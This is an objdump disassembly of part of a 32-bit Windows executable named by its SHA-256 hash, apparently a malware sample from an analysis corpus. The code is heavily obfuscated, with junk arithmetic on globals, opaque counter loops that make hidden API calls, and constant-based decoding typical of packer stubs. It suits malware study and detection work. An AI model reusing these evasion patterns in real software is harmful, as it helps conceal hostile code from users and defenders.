
2dac2fec53d44eecc82a6f8d8de2ed6307e5835137ce48e3a2389c313d916755.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	push   edi
  40100a:	or     DWORD PTR ds:0x42b018,0x42d018
  401014:	push   0x42e3c7
  401019:	xor    edi,edi
  40101b:	add    DWORD PTR ds:0x42d000,0x42d008
  401025:	inc    edi
  401026:	adc    DWORD PTR ds:0x42901c,0x42c00c
  401030:	push   edi
  401031:	dec    DWORD PTR ds:0x42a018
  401037:	push   edi
  401038:	not    DWORD PTR ds:0x42901c
  40103e:	call   DWORD PTR ds:0x42e90f
  401044:	test   eax,eax
  401046:	je     0x40106f
  40104c:	lea    eax,[ebp-0x50]
  40104f:	push   eax
  401050:	adc    DWORD PTR ds:0x42c018,0x408c
  40105a:	call   DWORD PTR ds:0x42e927
  401060:	mov    DWORD PTR ds:0x42c010,0x701a
  40106a:	jmp    0x4025df
  40106f:	or     DWORD PTR ds:0x42a010,0x42901c
  401079:	push   esi
  40107a:	or     DWORD PTR ds:0x42c018,0x254e
  401084:	mov    esi,DWORD PTR ds:0x42e90b
  40108a:	sub    DWORD PTR ds:0x42c000,0x42b014
  401094:	push   0x8
  401096:	add    DWORD PTR ds:0x42c004,0x1529
  4010a0:	push   0x42e3d7
  4010a5:	sub    DWORD PTR ds:0x42b00c,0x42c010
  4010af:	call   esi
  4010b1:	test   eax,eax
  4010b3:	je     0x4010f0
  4010b9:	sub    DWORD PTR ds:0x429004,0x42c000
  4010c3:	lea    eax,[ebp-0x50]
  4010c6:	sub    DWORD PTR ds:0x429000,0x1be5
  4010d0:	push   eax
  4010d1:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010db:	call   DWORD PTR ds:0x42e927
  4010e1:	mov    DWORD PTR ds:0x42b000,0x51df
  4010eb:	jmp    0x4025de
  4010f0:	push   ebx
  4010f1:	mov    ebx,DWORD PTR ds:0x429028
  4010f7:	or     ebx,DWORD PTR ds:0x429008
  4010fd:	mov    DWORD PTR ds:0x429028,ebx
  401103:	mov    ebx,DWORD PTR ds:0x42e907
  401109:	add    DWORD PTR ds:0x429024,0x4675
  401113:	push   0x42e3e7
  401118:	or     DWORD PTR ds:0x42c008,0x42c018
  401122:	push   edi
  401123:	adc    DWORD PTR ds:0x42c014,0x42b014
  40112d:	push   edi
  40112e:	call   ebx
  401130:	and    DWORD PTR ds:0x429020,0x61d3
  40113a:	test   eax,eax
  40113c:	jne    0x40121c
  401142:	sbb    DWORD PTR ds:0x42c004,0x42b004
  40114c:	push   0xc
  40114e:	mov    DWORD PTR ds:0x42d004,0x2d3b
  401158:	push   0x42e40b
  40115d:	call   esi
  40115f:	inc    DWORD PTR ds:0x42c008
  401165:	test   eax,eax
  401167:	mov    DWORD PTR ds:0x42b010,0x1593
  401171:	jne    0x40121c
  401177:	sub    DWORD PTR ds:0x42d000,0x17f0
  401181:	push   0x7
  401183:	add    DWORD PTR ds:0x429024,0x2885
  40118d:	push   0x42e41f
  401192:	call   esi
  401194:	and    DWORD PTR ds:0x42d014,0x42c000
  40119e:	test   eax,eax
  4011a0:	mov    DWORD PTR ds:0x42c014,0x720
  4011aa:	jne    0x40121c
  4011b0:	or     DWORD PTR ds:0x42b004,0x42b01c
  4011ba:	push   0x8
  4011bc:	push   0x42e42f
  4011c1:	sbb    DWORD PTR ds:0x42d014,0x5687
  4011cb:	call   esi
  4011cd:	xor    DWORD PTR ds:0x429014,0x42b018
  4011d7:	test   eax,eax
  4011d9:	mov    DWORD PTR ds:0x42d008,0x6461
  4011e3:	jne    0x40121c
  4011e9:	mov    DWORD PTR ds:0x42a014,0x128
  4011f3:	push   0x42e43f
  4011f8:	push   edi
  4011f9:	push   edi
  4011fa:	adc    DWORD PTR ds:0x429020,0x42a000
  401204:	call   DWORD PTR ds:0x42e90f
  40120a:	test   eax,eax
  40120c:	mov    DWORD PTR ds:0x42a01c,0x679f
  401216:	je     0x401249
  40121c:	lea    eax,[ebp-0x50]
  40121f:	sub    DWORD PTR ds:0x42c004,0x42a000
  401229:	push   eax
  40122a:	adc    DWORD PTR ds:0x429024,0xd32
  401234:	call   DWORD PTR ds:0x42e927
  40123a:	mov    DWORD PTR ds:0x42d008,0x45e0
  401244:	jmp    0x4025dd
  401249:	sub    DWORD PTR ds:0x429004,0x429014
  401253:	push   0x42e44f
  401258:	push   edi
  401259:	and    DWORD PTR ds:0x42b00c,0x7ff1
  401263:	push   edi
  401264:	or     DWORD PTR ds:0x42d014,0x42c01c
  40126e:	call   ebx
  401270:	test   eax,eax
  401272:	mov    DWORD PTR ds:0x429028,0x42c
  40127c:	je     0x401766
  401282:	xor    DWORD PTR ds:0x42b01c,0x42a010
  40128c:	push   0xc
  40128e:	xor    DWORD PTR ds:0x42d00c,0x685
  401298:	push   0x42e473
  40129d:	and    DWORD PTR ds:0x42a01c,0x363a
  4012a7:	call   esi
  4012a9:	test   eax,eax
  4012ab:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012b5:	jne    0x40175f
  4012bb:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012c5:	push   0x7
  4012c7:	push   0x42e487
  4012cc:	call   esi
  4012ce:	test   eax,eax
  4012d0:	jne    0x40175f
  4012d6:	push   0x8
  4012d8:	push   0x42e497
  4012dd:	call   esi
  4012df:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012e9:	test   eax,eax
  4012eb:	mov    DWORD PTR ds:0x42b01c,0x6bd8
  4012f5:	jne    0x40175f
  4012fb:	add    DWORD PTR ds:0x429000,0x429014
  401305:	push   0x42e4a7
  40130a:	push   edi
  40130b:	push   edi
  40130c:	xor    DWORD PTR ds:0x42d014,0x5ea1
  401316:	call   DWORD PTR ds:0x42e90f
  40131c:	sub    DWORD PTR ds:0x42901c,0x42c008
  401326:	test   eax,eax
  401328:	mov    DWORD PTR ds:0x42a004,0x3a7d
  401332:	jne    0x40175f
  401338:	push   0x42e4b7
  40133d:	and    DWORD PTR ds:0x42a004,0x429004
  401347:	push   edi
  401348:	or     DWORD PTR ds:0x42a01c,0x6055
  401352:	push   edi
  401353:	sub    DWORD PTR ds:0x429014,0x42b00c
  40135d:	call   ebx
  40135f:	xor    DWORD PTR ds:0x42b008,0x42a018
  401369:	test   eax,eax
  40136b:	mov    DWORD PTR ds:0x429014,0x3a80
  401375:	jne    0x40175f
  40137b:	or     DWORD PTR ds:0x42b00c,0x42b010
  401385:	push   0xc
  401387:	push   0x42e4db
  40138c:	call   esi
  40138e:	test   eax,eax
  401390:	jne    0x40175f
  401396:	mov    DWORD PTR ds:0x42900c,0x5e8c
  4013a0:	push   0x7
  4013a2:	push   0x42e4ef
  4013a7:	and    DWORD PTR ds:0x42b010,0x4122
  4013b1:	call   esi
  4013b3:	test   eax,eax
  4013b5:	mov    DWORD PTR ds:0x42a018,0x79ff
  4013bf:	jne    0x40175f
  4013c5:	push   0x8
  4013c7:	push   0x42e4ff
  4013cc:	call   esi
  4013ce:	test   eax,eax
  4013d0:	jne    0x40175f
  4013d6:	or     DWORD PTR ds:0x42a00c,0x42b01c
  4013e0:	push   0x42e50f
  4013e5:	sbb    DWORD PTR ds:0x42d004,0x5fa0
  4013ef:	push   edi
  4013f0:	and    DWORD PTR ds:0x42900c,0x42d00c
  4013fa:	push   edi
  4013fb:	add    DWORD PTR ds:0x42c010,0x54c5
  401405:	call   DWORD PTR ds:0x42e90f
  40140b:	mov    DWORD PTR ds:0x42b010,0x4d18
  401415:	test   eax,eax
  401417:	mov    DWORD PTR ds:0x42b018,0x69c2
  401421:	jne    0x40175f
  401427:	or     DWORD PTR ds:0x42c004,0x44f8
  401431:	push   0x42e51f
  401436:	add    DWORD PTR ds:0x42c004,0x42b01c
  401440:	push   edi
  401441:	adc    DWORD PTR ds:0x429004,0x4c2b
  40144b:	push   edi
  40144c:	call   ebx
  40144e:	test   eax,eax
  401450:	mov    DWORD PTR ds:0x42a008,0x516b
  40145a:	jne    0x40175f
  401460:	add    DWORD PTR ds:0x42d014,0x429018
  40146a:	push   0xc
  40146c:	push   0x42e543
  401471:	mov    DWORD PTR ds:0x42a004,0x58e8
  40147b:	call   esi
  40147d:	sbb    DWORD PTR ds:0x429028,0x2f15
  401487:	test   eax,eax
  401489:	jne    0x40175f
  40148f:	adc    DWORD PTR ds:0x42b000,0x4b6d
  401499:	push   0x7
  40149b:	sbb    DWORD PTR ds:0x42c014,0x42d004
  4014a5:	push   0x42e557
  4014aa:	or     DWORD PTR ds:0x42d008,0x1d0d
  4014b4:	call   esi
  4014b6:	xor    DWORD PTR ds:0x42c018,0xe1e
  4014c0:	test   eax,eax
  4014c2:	mov    DWORD PTR ds:0x42c010,0x6fc5
  4014cc:	jne    0x40175f
  4014d2:	push   0x8
  4014d4:	push   0x42e567
  4014d9:	add    DWORD PTR ds:0x42d000,0x42d018
  4014e3:	call   esi
  4014e5:	test   eax,eax
  4014e7:	jne    0x40175f
  4014ed:	push   0x42e577
  4014f2:	push   edi
  4014f3:	or     DWORD PTR ds:0x42d01c,0x429028
  4014fd:	push   edi
  4014fe:	call   DWORD PTR ds:0x42e90f
  401504:	test   eax,eax
  401506:	mov    DWORD PTR ds:0x42b018,0xe81
  401510:	jne    0x40175f
  401516:	or     DWORD PTR ds:0x42c00c,0x42b014
  401520:	push   0x42e587
  401525:	sub    DWORD PTR ds:0x42c004,0x429028
  40152f:	push   edi
  401530:	xor    DWORD PTR ds:0x42d010,0x42901c
  40153a:	push   edi
  40153b:	and    DWORD PTR ds:0x42d014,0x50c
  401545:	call   ebx
  401547:	test   eax,eax
  401549:	mov    DWORD PTR ds:0x42c008,0x6727
  401553:	jne    0x40175f
  401559:	push   0xc
  40155b:	adc    DWORD PTR ds:0x42a00c,0x1435
  401565:	push   0x42e5ab
  40156a:	mov    DWORD PTR ds:0x42c00c,0x3eef
  401574:	call   esi
  401576:	xor    DWORD PTR ds:0x42b014,0x10aa
  401580:	test   eax,eax
  401582:	mov    DWORD PTR ds:0x42a014,0x7a40
  40158c:	jne    0x40175f
  401592:	push   0x7
  401594:	adc    DWORD PTR ds:0x42b008,0x42a010
  40159e:	push   0x42e5bf
  4015a3:	or     DWORD PTR ds:0x42d004,0x42c014
  4015ad:	call   esi
  4015af:	add    DWORD PTR ds:0x42b008,0x42b014
  4015b9:	test   eax,eax
  4015bb:	mov    DWORD PTR ds:0x42c000,0x2197
  4015c5:	jne    0x40175f
  4015cb:	sub    DWORD PTR ds:0x42a004,0x42b008
  4015d5:	push   0x8
  4015d7:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015e1:	push   0x42e5cf
  4015e6:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015f0:	call   esi
  4015f2:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015fc:	test   eax,eax
  4015fe:	mov    DWORD PTR ds:0x42901c,0x7b99
  401608:	jne    0x40175f
  40160e:	adc    DWORD PTR ds:0x42c008,0x42901c
  401618:	push   0x42e5df
  40161d:	push   edi
  40161e:	push   edi
  40161f:	call   DWORD PTR ds:0x42e90f
  401625:	adc    DWORD PTR ds:0x42a004,0x43e7
  40162f:	test   eax,eax
  401631:	jne    0x40175f
  401637:	sbb    DWORD PTR ds:0x42b00c,0x42c008
  401641:	push   0x42e5ef
  401646:	or     DWORD PTR ds:0x42d00c,0x67f5
  401650:	push   edi
  401651:	mov    DWORD PTR ds:0x42c008,0x11d2
  40165b:	push   edi
  40165c:	add    DWORD PTR ds:0x429024,0x35c0
  401666:	call   ebx
  401668:	adc    DWORD PTR ds:0x42a01c,0x475f
  401672:	test   eax,eax
  401674:	mov    DWORD PTR ds:0x42c010,0x9db
  40167e:	jne    0x40175f
  401684:	add    DWORD PTR ds:0x42b01c,0x42c010
  40168e:	push   0xc
  401690:	push   0x42e613
  401695:	call   esi
  401697:	test   eax,eax
  401699:	jne    0x40175f
  40169f:	push   0x7
  4016a1:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016ab:	push   0x42e627
  4016b0:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016ba:	call   esi
  4016bc:	sub    DWORD PTR ds:0x429028,0x1e37
  4016c6:	test   eax,eax
  4016c8:	mov    DWORD PTR ds:0x429008,0x34bb
  4016d2:	jne    0x40175f
  4016d8:	adc    DWORD PTR ds:0x42d01c,0x42d008
  4016e2:	push   0x8
  4016e4:	neg    DWORD PTR ds:0x42d004
  4016ea:	push   0x42e637
  4016ef:	call   esi
  4016f1:	xor    DWORD PTR ds:0x429020,0x5303
  4016fb:	test   eax,eax
  4016fd:	jne    0x40175f
  401703:	sub    DWORD PTR ds:0x429014,0x42c01c
  40170d:	push   0x42e647
  401712:	not    DWORD PTR ds:0x429000
  401718:	push   edi
  401719:	or     DWORD PTR ds:0x42c01c,0x7461
  401723:	push   edi
  401724:	call   DWORD PTR ds:0x42e90f
  40172a:	test   eax,eax
  40172c:	mov    DWORD PTR ds:0x42901c,0x5bee
  401736:	jne    0x40175f
  40173c:	sbb    DWORD PTR ds:0x42c008,0x1a2b
  401746:	push   0x42e657
  40174b:	push   edi
  40174c:	neg    DWORD PTR ds:0x42b010
  401752:	push   edi
  401753:	sbb    DWORD PTR ds:0x42c000,0x42b008
  40175d:	call   ebx
  40175f:	xor    eax,eax
  401761:	jmp    0x4025dd
  401766:	mov    esi,DWORD PTR ds:0x41cde0
  40176c:	mov    eax,ds:0x41ce2c
  401771:	sub    eax,esi
  401773:	xor    esi,DWORD PTR [esi+eax*1]
  401776:	mov    DWORD PTR [ebp-0x10],0x0
  40177d:	mov    eax,DWORD PTR [ebp-0x34]
  401780:	mov    DWORD PTR [ebp-0x34],eax
  401783:	mov    ecx,0xf89c8585
  401788:	neg    edi
  40178a:	mov    DWORD PTR [ebp-0x8],ecx
  40178d:	mov    edx,DWORD PTR ds:0x42d018
  401793:	sub    edx,DWORD PTR ds:0x42b000
  401799:	mov    DWORD PTR ds:0x42d018,edx
  40179f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4017a6:	xor    esi,esi
  4017a8:	add    esi,DWORD PTR ds:0x41cd71
  4017ae:	xor    edx,edx
  4017b0:	add    edx,DWORD PTR ds:0x41cdf8
  4017b6:	sub    esi,edx
  4017b8:	and    esi,DWORD PTR [esi+edx*1]
  4017bb:	lea    eax,[ebp-0x3c]
  4017be:	and    DWORD PTR ds:0x42c000,0x550f
  4017c8:	mov    DWORD PTR [ebp-0x30],eax
  4017cb:	mov    DWORD PTR ds:0x42a010,0x1f
  4017d5:	cmp    DWORD PTR ds:0x42a010,0x0
  4017dc:	je     0x40182a
  4017e2:	cmp    DWORD PTR ds:0x42a010,0x2a
  4017e9:	jne    0x401805
  4017ef:	push   DWORD PTR [ebp-0x10]
  4017f2:	push   0x7c9b
  4017f7:	push   0x511d
  4017fc:	push   DWORD PTR [ebp-0x1c]
  4017ff:	call   DWORD PTR ds:0x42e8e7
  401805:	mov    edx,DWORD PTR ds:0x42a010
  40180b:	dec    edx
  40180c:	mov    DWORD PTR ds:0x42a010,edx
  401812:	jmp    0x4017d5
  401817:	mov    edx,DWORD PTR ds:0x41cdd8
  40181d:	xor    edi,edi
  40181f:	xor    edi,DWORD PTR ds:0x41ce10
  401825:	sub    edi,edx
  401827:	add    edx,DWORD PTR [edx+edi*1]
  40182a:	lea    eax,[ebp-0x44]
  40182d:	mov    DWORD PTR [ebp-0x18],eax
  401830:	mov    edi,DWORD PTR ds:0x41ce2c
  401836:	mov    edx,DWORD PTR ds:0x41cd89
  40183c:	sub    edx,edi
  40183e:	imul   edi,DWORD PTR [edi+edx*1]
  401842:	mov    eax,ds:0x42e2b7
  401847:	movzx  edx,BYTE PTR ds:0x42a01c
  40184e:	and    edx,DWORD PTR ds:0x42c010
  401854:	mov    DWORD PTR ds:0x42a01c,edx
  40185a:	mov    eax,DWORD PTR [eax+0x1c8]
  401860:	mov    eax,DWORD PTR [eax]
  401862:	xor    edi,edi
  401864:	mov    edx,DWORD PTR [ebp-0x18]
  401867:	mov    esi,DWORD PTR ds:0x429028
  40186d:	and    DWORD PTR ds:0x42d004,esi
  401873:	mov    esi,0x751089b
  401878:	or     DWORD PTR ds:0x42900c,ebx
  40187e:	xor    eax,esi
  401880:	and    DWORD PTR ds:0x42b010,0x0
  40188a:	mov    edi,DWORD PTR ds:0x42b010
  401890:	inc    edi
  401891:	mov    DWORD PTR ds:0x42b010,edi
  401897:	cmp    DWORD PTR ds:0x42b010,0x25
  40189e:	jne    0x4018ba
  4018a4:	push   DWORD PTR [ebp-0x1c]
  4018a7:	push   DWORD PTR [ebp-0x10]
  4018aa:	push   0x42e000
  4018af:	push   0x400000
  4018b4:	call   DWORD PTR ds:0x42e8eb
  4018ba:	cmp    DWORD PTR ds:0x42b010,0x17
  4018c1:	jb     0x40188a
  4018c7:	mov    edi,0x3272e2
  4018cc:	add    eax,edi
  4018ce:	mov    DWORD PTR ds:0x42a010,0x30bc
  4018d8:	mov    DWORD PTR [edx],eax
  4018da:	mov    DWORD PTR ds:0x42c014,0x6382
  4018e4:	mov    eax,ds:0x42e753
  4018e9:	mov    DWORD PTR ds:0x429028,0x5397
  4018f3:	cmp    eax,0x312bc9f6
  4018f8:	jne    0x401986
  4018fe:	mov    eax,DWORD PTR [ebp-0x8]
  401901:	sub    DWORD PTR ds:0x42c004,edx
  401907:	mov    edx,DWORD PTR ds:0x42e2b7
  40190d:	mov    ebx,DWORD PTR ds:0x41ce24
  401913:	mov    ebx,DWORD PTR [ebx]
  401915:	adc    DWORD PTR ds:0x42a018,ebx
  40191b:	mov    edx,DWORD PTR [edx+0x198]
  401921:	xor    ebx,0x3fd0
  401927:	xor    eax,esi
  401929:	sbb    DWORD PTR ds:0x429010,0x42901c
  401933:	add    eax,edi
  401935:	or     DWORD PTR ds:0x42900c,edx
  40193b:	mov    DWORD PTR [edx],eax
  40193d:	mov    eax,DWORD PTR [ebp-0x8]
  401940:	and    DWORD PTR ds:0x42a014,0x0
  40194a:	mov    ebx,DWORD PTR ds:0x42a014
  401950:	inc    ebx
  401951:	mov    DWORD PTR ds:0x42a014,ebx
  401957:	cmp    DWORD PTR ds:0x42a014,0x20
  40195e:	jne    0x40196a
  401964:	call   DWORD PTR ds:0x42e8ef
  40196a:	cmp    DWORD PTR ds:0x42a014,0x1c
  401971:	jb     0x40194a
  401977:	xor    eax,esi
  401979:	add    eax,edi
  40197b:	add    DWORD PTR ds:0x42d00c,ebx
  401981:	mov    ds:0x42e753,eax
  401986:	mov    eax,ds:0x42e2b7
  40198b:	and    DWORD PTR ds:0x42c014,0x7897
  401995:	mov    eax,DWORD PTR [eax+0x18c]
  40199b:	or     DWORD PTR ds:0x42d004,0x42d014
  4019a5:	mov    eax,DWORD PTR [eax]
  4019a7:	sbb    ebx,0x2d4c
  4019ad:	mov    DWORD PTR [ebp-0x7c],eax
  4019b0:	sbb    DWORD PTR ds:0x42c008,edx
  4019b6:	mov    ebx,0xf89c85b9
  4019bb:	neg    eax
  4019bd:	mov    DWORD PTR [ebp-0x10],ebx
  4019c0:	and    DWORD PTR ds:0x42c000,0x0
  4019ca:	mov    eax,ds:0x42c000
  4019cf:	inc    eax
  4019d0:	mov    ds:0x42c000,eax
  4019d5:	cmp    DWORD PTR ds:0x42c000,0xa
  4019dc:	jne    0x4019e8
  4019e2:	call   DWORD PTR ds:0x42e8f3
  4019e8:	cmp    DWORD PTR ds:0x42c000,0x9
  4019ef:	jne    0x401a00
  4019f5:	mov    eax,ds:0x42c000
  4019fa:	inc    eax
  4019fb:	mov    ds:0x42c000,eax
  401a00:	cmp    DWORD PTR ds:0x42c000,0x15
  401a07:	jb     0x4019ca
  401a0d:	movzx  eax,WORD PTR ds:0x42c00c
  401a14:	and    eax,DWORD PTR ds:0x42c018
  401a1a:	mov    ds:0x42c00c,eax
  401a1f:	mov    DWORD PTR [ebp-0x10],ebx
  401a22:	sub    DWORD PTR ds:0x42b004,ecx
  401a28:	mov    DWORD PTR [ebp-0x10],ebx
  401a2b:	mov    DWORD PTR [ebp-0x18],ecx
  401a2e:	mov    DWORD PTR [ebp-0x10],ebx
  401a31:	dec    DWORD PTR ds:0x42c014
  401a37:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401a3e:	mov    eax,ds:0x42a010
  401a43:	adc    DWORD PTR ds:0x42b00c,eax
  401a49:	mov    eax,DWORD PTR [ebp-0x8]
  401a4c:	add    DWORD PTR ds:0x42a004,0x42901c
  401a56:	xor    eax,esi
  401a58:	add    eax,edi
  401a5a:	mov    DWORD PTR ds:0x42d00c,0x4361
  401a64:	jmp    0x401b08
  401a69:	and    eax,ecx
  401a6b:	mov    eax,DWORD PTR [ebp-0xc]
  401a6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a71:	sbb    DWORD PTR ds:0x42d01c,0x38e1
  401a7b:	xor    eax,esi
  401a7d:	or     DWORD PTR ds:0x42b008,0x32de
  401a87:	lea    eax,[eax+ecx*1+0x3272e2]
  401a8e:	or     DWORD PTR ds:0x42900c,0x42c014
  401a98:	push   eax
  401a99:	mov    eax,DWORD PTR [ebp-0x18]
  401a9c:	mov    DWORD PTR ds:0x42b000,0x3f7a
  401aa6:	xor    eax,esi
  401aa8:	adc    DWORD PTR ds:0x42a000,0x429018
  401ab2:	lea    eax,[ebp+eax*1+0x3272ea]
  401ab9:	or     DWORD PTR ds:0x429000,0x42d01c
  401ac3:	push   eax
  401ac4:	sbb    eax,DWORD PTR ds:0x429000
  401aca:	mov    eax,ds:0x42e2b7
  401acf:	push   DWORD PTR [eax+0x1bc]
  401ad5:	and    DWORD PTR ds:0x42d014,0x65ae
  401adf:	call   0x4025f2
  401ae4:	mov    eax,DWORD PTR [ebp-0xc]
  401ae7:	or     edx,0x44
  401aed:	mov    ecx,DWORD PTR [ebp-0x1c]
  401af0:	neg    edx
  401af2:	xor    eax,esi
  401af4:	movzx  edx,BYTE PTR ds:0x42d000
  401afb:	add    DWORD PTR ds:0x429008,edx
  401b01:	lea    eax,[ecx+eax*1+0x3272e2]
  401b08:	mov    ecx,DWORD PTR [ebp-0xc]
  401b0b:	sbb    DWORD PTR ds:0x42900c,0x42c010
  401b15:	mov    edx,DWORD PTR [ebp-0xc]
  401b18:	sbb    DWORD PTR ds:0x42c00c,0x3f25
  401b22:	xor    edx,esi
  401b24:	xor    DWORD PTR ds:0x42901c,0x360b
  401b2e:	xor    ecx,esi
  401b30:	add    ecx,edx
  401b32:	mov    edx,DWORD PTR [ebp-0xc]
  401b35:	xor    edx,esi
  401b37:	lea    ecx,[ecx+edx*1+0x9758a6]
  401b3e:	mov    DWORD PTR ds:0x429010,0x1f54
  401b48:	mov    DWORD PTR [ebp-0x1c],eax
  401b4b:	cmp    eax,ecx
  401b4d:	jbe    0x401a69
  401b53:	mov    eax,ds:0x429020
  401b58:	adc    DWORD PTR ds:0x42901c,eax
  401b5e:	mov    eax,DWORD PTR [ebp+0xc]
  401b61:	mov    ecx,DWORD PTR ds:0x41cd6d
  401b67:	mov    ecx,DWORD PTR [ecx]
  401b69:	or     DWORD PTR ds:0x429028,ecx
  401b6f:	mov    ds:0x42e13b,eax
  401b74:	mov    ecx,DWORD PTR ds:0x429000
  401b7a:	or     DWORD PTR ds:0x42c008,ecx
  401b80:	mov    eax,DWORD PTR [ebp+0x10]
  401b83:	and    DWORD PTR ds:0x42b01c,0x0
  401b8d:	jmp    0x401b9f
  401b92:	mov    ecx,DWORD PTR ds:0x42b01c
  401b98:	inc    ecx
  401b99:	mov    DWORD PTR ds:0x42b01c,ecx
  401b9f:	cmp    DWORD PTR ds:0x42b01c,0x11
  401ba6:	jae    0x401bd3
  401bac:	cmp    DWORD PTR ds:0x42b01c,0x16
  401bb3:	jne    0x401bc4
  401bb9:	push   0x42e0f6
  401bbe:	call   DWORD PTR ds:0x42e8f7
  401bc4:	jmp    0x401b92
  401bc9:	mov    DWORD PTR ds:0x42a018,0x900
  401bd3:	mov    ds:0x42e38f,eax
  401bd8:	adc    DWORD PTR ds:0x42d008,0x597
  401be2:	mov    eax,ds:0x42e13b
  401be7:	mov    DWORD PTR ds:0x42901c,0x19
  401bf1:	cmp    DWORD PTR ds:0x42901c,0x0
  401bf8:	je     0x401c2a
  401bfe:	cmp    DWORD PTR ds:0x42901c,0x23
  401c05:	jne    0x401c16
  401c0b:	push   0x42e075
  401c10:	call   DWORD PTR ds:0x42e8fb
  401c16:	mov    ecx,DWORD PTR ds:0x42901c
  401c1c:	dec    ecx
  401c1d:	mov    DWORD PTR ds:0x42901c,ecx
  401c23:	jmp    0x401bf1
  401c28:	neg    ecx
  401c2a:	mov    ecx,DWORD PTR [ebp-0x30]
  401c2d:	sub    eax,edi
  401c2f:	xor    eax,esi
  401c31:	mov    DWORD PTR [ecx],eax
  401c33:	mov    eax,DWORD PTR [ebp-0x34]
  401c36:	mov    DWORD PTR ds:0x42c014,0x2861
  401c40:	cmp    eax,0xf89c8585
  401c45:	jne    0x401f18
  401c4b:	lea    eax,[ebp-0x48]
  401c4e:	mov    DWORD PTR [ebp-0x9c],eax
  401c54:	lea    eax,[ebp+0x4]
  401c57:	or     DWORD PTR ds:0x42d000,0x2377
  401c61:	mov    DWORD PTR [ebp-0x48],eax
  401c64:	xor    DWORD PTR ds:0x42a018,ecx
  401c6a:	mov    eax,DWORD PTR [ebp-0x48]
  401c6d:	test   eax,eax
  401c6f:	mov    DWORD PTR ds:0x42c00c,0x1657
  401c79:	je     0x4025c2
  401c7f:	mov    eax,DWORD PTR [ebp-0x24]
  401c82:	mov    eax,DWORD PTR [ebp-0xc]
  401c85:	sbb    eax,ecx
  401c87:	mov    eax,DWORD PTR [ebp-0x8]
  401c8a:	or     ecx,DWORD PTR ds:0x42c018
  401c90:	mov    DWORD PTR [ebp+0xc],eax
  401c93:	xor    DWORD PTR ds:0x42a014,edi
  401c99:	mov    eax,eax
  401c9b:	sub    DWORD PTR ds:0x42c000,0x352b
  401ca5:	mov    eax,ds:0x42e2b7
  401caa:	mov    DWORD PTR ds:0x42b014,0x12
  401cb4:	cmp    DWORD PTR ds:0x42b014,0x0
  401cbb:	je     0x401d04
  401cc1:	cmp    DWORD PTR ds:0x42b014,0x7
  401cc8:	jne    0x401cd4
  401cce:	call   DWORD PTR ds:0x42e8ff
  401cd4:	cmp    DWORD PTR ds:0x42b014,0x8
  401cdb:	jne    0x401cf0
  401ce1:	xor    ecx,ecx
  401ce3:	add    ecx,DWORD PTR ds:0x42b014
  401ce9:	dec    ecx
  401cea:	mov    DWORD PTR ds:0x42b014,ecx
  401cf0:	xor    ecx,ecx
  401cf2:	xor    ecx,DWORD PTR ds:0x42b014
  401cf8:	dec    ecx
  401cf9:	mov    DWORD PTR ds:0x42b014,ecx
  401cff:	jmp    0x401cb4
  401d04:	mov    eax,DWORD PTR [eax+0x1c8]
  401d0a:	mov    eax,DWORD PTR [eax]
  401d0c:	mov    DWORD PTR ds:0x429004,0x1d
  401d16:	cmp    DWORD PTR ds:0x429004,0x0
  401d1d:	je     0x401d6d
  401d23:	cmp    DWORD PTR ds:0x429004,0x4
  401d2a:	jne    0x401d41
  401d30:	push   DWORD PTR [ebp-0x28]
  401d33:	push   0x42d000
  401d38:	push   DWORD PTR [ebp-0xc]
  401d3b:	call   DWORD PTR ds:0x42e903
  401d41:	cmp    DWORD PTR ds:0x429004,0x5
  401d48:	jne    0x401d5b
  401d4e:	mov    ecx,DWORD PTR ds:0x429004
  401d54:	dec    ecx
  401d55:	mov    DWORD PTR ds:0x429004,ecx
  401d5b:	mov    ecx,DWORD PTR ds:0x429004
  401d61:	dec    ecx
  401d62:	mov    DWORD PTR ds:0x429004,ecx
  401d68:	jmp    0x401d16
  401d6d:	cdq    
  401d6e:	inc    ecx
  401d6f:	mov    ebx,eax
  401d71:	mov    ecx,DWORD PTR ds:0x42b008
  401d77:	adc    ecx,DWORD PTR ds:0x42b000
  401d7d:	mov    DWORD PTR ds:0x42b008,ecx
  401d83:	mov    eax,0xfabdbee7
  401d88:	and    DWORD PTR ds:0x429014,edi
  401d8e:	add    ebx,eax
  401d90:	mov    DWORD PTR ds:0x42c004,0x916
  401d9a:	adc    edx,0xffffffff
  401d9d:	and    DWORD PTR [ebp-0x10],0x0
  401da1:	or     DWORD PTR ds:0x42b018,0x42d014
  401dab:	xor    edx,0x0
  401dae:	mov    DWORD PTR [ebp-0x6c],edx
  401db1:	adc    DWORD PTR ds:0x42d008,ebx
  401db7:	mov    edx,DWORD PTR [ebp+0xc]
  401dba:	sbb    DWORD PTR ds:0x429004,edi
  401dc0:	mov    DWORD PTR [ebp-0x14],edx
  401dc3:	mov    ecx,0x8a29a12d
  401dc8:	add    edx,0x36ec
  401dce:	xor    ebx,ecx
  401dd0:	add    DWORD PTR [ebp-0x14],eax
  401dd3:	mov    DWORD PTR ds:0x42901c,ebx
  401dd9:	mov    edx,DWORD PTR [ebp-0x14]
  401ddc:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401de0:	xor    edx,ecx
  401de2:	mov    DWORD PTR [ebp-0x5c],edx
  401de5:	or     DWORD PTR ds:0x42a00c,edi
  401deb:	mov    edx,DWORD PTR [ebp-0x10]
  401dee:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401df8:	xor    edx,0x0
  401dfb:	mov    DWORD PTR [ebp-0x58],edx
  401dfe:	mov    DWORD PTR ds:0x42900c,0x40f4
  401e08:	cmp    DWORD PTR [ebp-0x5c],ebx
  401e0b:	mov    DWORD PTR ds:0x42a004,0x5ee8
  401e15:	jne    0x401e3b
  401e1b:	mov    DWORD PTR ds:0x42b004,0x3032
  401e25:	mov    edx,DWORD PTR [ebp-0x6c]
